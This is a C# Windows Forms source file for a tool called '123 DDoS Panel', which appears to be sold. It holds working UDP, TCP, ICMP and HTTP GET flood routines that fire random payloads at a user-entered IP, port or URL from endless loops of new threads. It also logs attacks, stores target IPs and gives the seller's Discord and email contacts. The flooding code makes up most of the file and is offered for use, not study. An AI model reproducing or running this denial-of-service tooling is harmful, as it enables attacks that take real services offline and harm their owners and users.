using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;

namespace _123_DDoS_Panel
{
    public partial class Form1 : Form
    {
        private int amount;
        private int amountf;
        public Form1()
        {
            InitializeComponent();
        }

        private void dateandtime_Tick(object sender, EventArgs e)
        {
            //date and time
            label6.Text = DateTime.Now.ToLongTimeString();
            label7.Text = DateTime.Now.ToLongDateString();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //attack log
            StreamWriter A = new StreamWriter(Application.StartupPath + "\\Attack logs\\" + "Attack logs.txt");

            A.WriteLine(label9.Text + " " + textBox1.Text);
            A.WriteLine(label2.Text + " " + textBox2.Text);
            A.WriteLine(label3.Text + " " + comboBox1.Text);
            A.WriteLine(label4.Text + " " + textBox3.Text);
            A.WriteLine(label5.Text + " " + textBox4.Text);

            A.Close();

            //shows attack was sent
            MessageBox.Show("Attack successfully sent");

            if (textBox1.Text == "")
            {
                MessageBox.Show("Error IP Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (textBox2.Text == "")
            {
                MessageBox.Show("Error Port Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (textBox3.Text == "")
            {
                MessageBox.Show("Error Thread box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (textBox4.Text == "")
            {
                MessageBox.Show("Error Size Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (comboBox1.Text == "")
            {
                MessageBox.Show("Error Methods Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (comboBox1.Text == "UDP")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        udpattack();
                    }
                }).Start();
            }
            else if (comboBox1.Text == "TCP")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        tcpattack();
                    }
                }).Start();
            }
            else if (comboBox1.Text == "ICMP")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        icmpattack();
                    }
                }).Start();
            }
            else if (comboBox1.Text == "HTTP/GET (under dev)")
            {
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
                    {
                        HTTPGETATTACK();
                    }
                }).Start();
            }
        }

        public static String generateStringSize(long sizeByte)
        {

            StringBuilder sb = new StringBuilder();
            Random rd = new Random();

            var numOfChars = sizeByte;
            string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            int maxIndex = allows.Length - 1;
            for (int i = 0; i < numOfChars; i++)
            {
                int index = rd.Next(maxIndex);
                char c = allows[index];
                sb.Append(c);
            }
            return sb.ToString();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Attack Stopped. Exiting app.");
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        public void udpattack()
        {

            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
                ProtocolType.Udp);

            System.Net.IPAddress serverAddr = System.Net.IPAddress.Parse(textBox1.Text);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(textBox2.Text));
            string data = generateStringSize(1024 * int.Parse(textBox4.Text));
            byte[] sus = Encoding.ASCII.GetBytes(data);
            sock.Connect(serverAddr, int.Parse(textBox2.Text));
            for (; ; )
            {
                new Thread(() =>
                {
                    try
                    {
                        sock.SendTo(sus, endPoint);
                        amount++;
                    }
                    catch
                    {
                        amountf++;
                    }
                }).Start();
            }
        }
        public void tcpattack()
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            System.Net.IPAddress serverAddr = System.Net.IPAddress.Parse(textBox1.Text);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(textBox2.Text));
            string data = generateStringSize(1024 * int.Parse(textBox4.Text));
            byte[] sus = Encoding.ASCII.GetBytes(data);
            sock.Connect(serverAddr, int.Parse(textBox2.Text));
            for (; ; )
            {
                new Thread(() =>
                {
                    try
                    {
                        sock.SendTo(sus, endPoint);
                        amount++;
                    }
                    catch
                    {
                        amountf++;
                    }
                }).Start();
            }
        }
        public void icmpattack()
        {
            new Thread(() =>
            {
                Ping pingSender = new Ping();
                string data = generateStringSize(1024 * 1);
                byte[] sus = Encoding.ASCII.GetBytes(data);
                int timeout = 5000;
                PingOptions options = new PingOptions(64, true);
                for (; ; )
                {
                    new Thread(() =>
                    {
                        try
                        {
                            PingReply reply = pingSender.Send(textBox1.Text, timeout, sus, options);
                            amount++;
                        }
                        catch
                        {
                            amountf++;
                        }
                    }).Start();
                }
            }).Start();
        }
        public void HTTPGETATTACK()
        {
            var url = textBox1.Text;

            for (; ; )
            {
                new Thread(() =>
                {
                    WebRequest request = WebRequest.Create(textBox1.Text);
                    request.Method = "GET";
                    try
                    {
                        WebResponse response = request.GetResponse();
                        amount++;
                    }
                    catch
                    {
                        amountf++;
                    }
                }).Start();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            MessageBox.Show(getMyIPAddress());
        }

        private string getMyIPAddress()
        {
            String Address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                Address = stream.ReadToEnd();
            }
            int first = Address.IndexOf("Address: ") + 9;
            int last = Address.IndexOf("</body>");
            Address = Address.Substring(first, last - first);
            return Address;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Discord: George Batholimew Hograth#0869\nEmail: Pringle687@proton.me", "Contact Me", MessageBoxButtons.OK);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            new graph().Show();
            this.Hide();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("You are already on the Attack Hub.", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void button9_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo("https://www.youtube.com/channel/UCkP2YjZfvZIfArYbAUyRLsg") { UseShellExecute = true });
        }

        private void button11_Click(object sender, EventArgs e)
        {
            StreamWriter A = new StreamWriter(Application.StartupPath + "\\IP Storage\\" + "IPs.txt");

            MessageBox.Show("Saved to 'IPs.txt'.");
            A.WriteLine(label14.Text + " " + textBox6.Text);
            A.WriteLine(label15.Text + " " + textBox7.Text);

            A.Close();
        }

        private void button13_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Thank you so much for purchasing this tool :)");
        }

        private void button12_Click(object sender, EventArgs e)
        {
            new Settings().Show();
            this.Hide();
        }

        private void button14_Click(object sender, EventArgs e)
        {
            MessageBox.Show("To Recieve help, support or report a bug, simply join my Discord and navigate to the help section and leave your comments there and i will try and respond asap");
        }

        private void button15_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo("https://drive.google.com/drive/folders/1myezzlndx8HAv9wtVErD2hoIAP_5Q4g-") { UseShellExecute = true });
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo("https://discord.gg/SPeJxvmE") { UseShellExecute = true });
        }

        private void button16_Click(object sender, EventArgs e)
        {
            new Moretools().Show();
            this.Hide();
        }

        private void button17_Click(object sender, EventArgs e)
        {
            var username = System.Environment.GetEnvironmentVariable("USERNAME");
            Process.Start(new ProcessStartInfo("C:\\Users\\" + username + "\\Desktop\\123 DDoS Panel\\123 DDoS Panel\\123 DDoS Panel\\bin\\Debug\\net6.0-windows\\IP Storage") { UseShellExecute = true });
        }

        private void button18_Click(object sender, EventArgs e)
        {
            var username = System.Environment.GetEnvironmentVariable("USERNAME");
            Process.Start(new ProcessStartInfo("C:\\Users\\" + username + "\\Desktop\\123 DDoS Panel\\123 DDoS Panel\\123 DDoS Panel\\bin\\Debug\\net6.0-windows\\Attack logs") { UseShellExecute = true });
        }

        private void button7_Click(object sender, EventArgs e)
        {
            var username = System.Environment.GetEnvironmentVariable("USERNAME");
            Process.Start(new ProcessStartInfo("C:\\Users\\" + username + "\\Desktop\\123 DDoS Panel\\123 DDoS Panel\\123 DDoS Panel\\bin\\Debug\\net6.0-windows\\Online IP Lookup\\Online IP Lookup.py") { UseShellExecute = true });
            Process.Start(new ProcessStartInfo("https://127.0.0.1:80") { UseShellExecute = true });
        }
    }
}